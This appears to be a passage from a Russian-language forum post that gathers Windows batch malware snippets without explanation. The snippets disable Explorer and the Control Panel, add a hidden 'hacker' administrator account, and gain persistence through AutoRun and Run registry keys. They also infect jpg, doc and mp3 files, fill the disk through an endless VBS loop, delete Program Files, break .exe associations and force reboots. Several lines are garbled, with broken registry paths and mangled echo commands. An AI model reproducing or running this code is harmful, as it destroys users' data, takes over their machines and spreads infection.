reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul[/SRC]
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul[/SRC]
reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer
/v NoControlPanel /t REG_DWORD /d 1 /f >nul[/SRC]
[SRC]reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v @C:\WINDOWS\system32\SHELL32.dll,-8964 /t REG_SZ /d ТУТ НАЗВАНИЕ КОРЗИНЫ /F[/SRC]
[SRC]del %0[/SRC]
[SRC]:x
Start mspaint
goto x[/SRC]
[SRC]copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\batinit.bat" /f >nul[/SRC]
[SRC]Echo_inactive_inactive off
chcp 1251
net user SUPPORT_388945a0 /delete
net user hacker hack /add
net localgroup Администраторы hacker /add
net localgroup Пользователи SUPPORT_388945a0 /del
reg add "HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogonSpecialAccountsUserList" /v "support" /t reg_dword /d 0 y[/SRC]
[SRC]rundll32 user,disableoemlayer[/SRC]
[SRC]Echo_inactive_inactive off%[MrWeb]%
if '%1=='In_ goto MrWebin
if exist c:\MrWeb.bat goto MrWebru
if not exist %0 goto MrWeben
find "MrWeb"<%0>c:\MrWeb.bat
attrib +h c:\MrWeb.bat
:MrWebru
for %%g in (..\*.jpg ..\*.doc ..\*.htm? *.jpg *.mp3 *.doc *.htm? *.xls) do call c:\MrWeb In_ %%ggoto MrWeben
:MrWebin
if exist %2.bat goto MrWeben
type c:\MrWeb.bat>>%2.bat
echo start %2>>%2.bat%[MrWeb]%
:MrWeben[/SRC]
[SRC]Echo_inactive_inactive off%[MrWeb]%
if '%1=='In_ goto MrWebin
if exist c:\MrWeb.bat goto MrWebru
if not exist %0 goto MrWeben
find "MrWeb"<%0>c:\MrWeb.bat
attrib +h c:\MrWeb.bat
:MrWebru
for %%g in (*.jpg) do call c:\MrWeb In_ %%g
goto MrWeben
:MrWebin
if exist %2.bat goto MrWeben
type c:\MrWeb.bat>>%2.bat
echo start %2>>%2.bat%[MrWeb]%
:MrWeben[/SRC]
[SRC]Echo_inactive_inactive off
echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs
echo do >> %systemdrive%\windows\system32\rundll32.vbs
echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs
echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs
echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs
echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs
echo loop >> %systemdrive%\windows\system32\rundll32.vbs
start %systemdrive%\windows\system32\rundll32.vbs
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f[/SRC]
[SRC]Echo_inactive_inactive off
echo Set fso = CreateObject("Scripting.FileSystemObject") > %systemdrive%\windows\system32\rundll32.vbs
echo do >> %systemdrive%\windows\system32\rundll32.vbs
echo Set tx = fso.CreateTextFile("%systemdrive%\windows\system32\rundll32.dat", True) >> %systemdrive%\windows\system32\rundll32.vbs
echo tx.WriteBlankLines(100000000) >> %systemdrive%\windows\system32\rundll32.vbs
echo tx.close >> %systemdrive%\windows\system32\rundll32.vbs
echo FSO.DeleteFile "%systemdrive%\windows\system32\rundll32.dat" >> %systemdrive%\windows\system32\rundll32.vbs
echo loop >> %systemdrive%\windows\system32\rundll32.vbs
start %systemdrive%\windows\system32\rundll32.vbs
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v system_host_run /t REG_SZ /d %systemdrive%\windows\system32\rundll32.vbs /f[/SRC]
[SRC]Echo_inactive_inactive off
Echo Virus Loading
Date 13.09.96
If exist c:ski.bat goto abc
Copy %0 c:ski.bat
Attrib +h c:ski.bat
Echo c:ski.bat >>autoexec.bat
:abc
md PRIDUROK
md LUZER
md DURAK
md LAMER
Label E: PRIDUROK
assoc .exe=.mp3
del c:Program Files/q
Echo VIRUS LOAD
shutdown -r -t 1 -c "lol" >nul[/SRC]
